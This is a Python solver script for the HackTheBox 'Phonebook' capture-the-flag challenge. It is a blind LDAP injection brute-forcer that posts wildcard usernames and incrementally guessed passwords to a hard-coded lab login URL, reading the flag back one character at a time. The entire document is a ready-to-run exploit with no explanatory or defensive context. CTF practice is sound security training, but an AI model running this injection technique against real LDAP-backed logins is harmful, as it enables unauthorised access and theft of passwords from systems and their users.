#!/usr/bin/python3
# https://app.hackthebox.com/challenges/phonebook solver
import requests
from string import ascii_lowercase, ascii_uppercase, digits, punctuation

chars = ascii_lowercase + ascii_uppercase + digits + punctuation
chars = chars.replace("*", "")

print("[@] LDAP Bruteforcer :)\n")
url = "http://178.128.163.152:32200/login"
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
           "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
           "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://178.128.163.152:32200",
           "Connection": "close", "Upgrade-Insecure-Requests": "1", "DNT": "1", "Sec-GPC": "1"}
flag = ''
while True:
    for i in chars:
        if flag != '':
            data = {"username": "*", "password": f"{flag + i}*"}
        else:
            data = {"username": "*", "password": f"{i}*"}
        resp = requests.post(url, headers=headers, data=data)
        if "No search results." in resp.text:
            flag = flag + i
            print(f"Flag: {flag}", end="\r")
            break
